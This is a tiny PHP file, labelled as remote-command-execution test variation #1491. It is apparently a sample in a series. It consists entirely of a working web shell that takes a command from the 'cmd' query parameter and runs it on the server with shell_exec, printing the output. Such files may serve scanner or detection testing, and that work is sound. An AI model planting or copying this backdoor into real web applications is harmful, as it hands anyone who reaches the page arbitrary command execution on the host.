<?php
// RCE test variation #1491
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>